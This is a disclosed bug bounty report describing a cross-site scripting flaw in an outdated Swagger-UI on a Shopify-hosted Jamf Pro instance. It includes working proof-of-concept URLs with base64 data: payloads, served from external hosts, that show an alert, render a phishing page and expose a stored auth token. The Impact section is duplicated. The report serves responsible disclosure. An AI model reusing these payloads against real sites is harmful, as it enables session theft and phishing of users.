# XSS at jamfpro.shopifycloud.com

## Report Details
- **Report ID**: 1444682
- **URL**: https://hackerone.com/reports/1444682
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-09T21:17:19.949Z
- **Disclosed**: 2023-02-02T20:45:36.248Z

## Reporter
- **Username**: kannthu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
*Description*
There is Jamf Pro running at https://jamfpro.shopifycloud.com/ which has old Swagger-UI exposed at /classicapi/doc/. I think it's possible to take over the Jamf Pro account of the user that clicks the link. (more about that below) 

*Steps to reproduce*

**POC with simple alert box**:
1. Open `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
2. You should see an alert box (F1573391)

**POC rendering phishing page**:
1. Click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9`
2. You should see a phishing page rendered (F1573392)

**POC of stealing auth token**:
Jamf Pro stores authentication token in localstorage under `authToken` key when you authenticate using login and password, so my assumption is that it will do the same for Saml authentication. (you will have to test that) If it's true then taking over the user's account who clicked the link would be trivial. The POC below will print `authToken` from localstorage.

1. Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
2. You should see an alert box with auth token. 

## Impact

An attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.

## Impact

An attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.

## Attachments
- Zrzut_ekranu_2022-01-9_o_22.08.24.png
- Zrzut_ekranu_2022-01-9_o_22.08.49.png
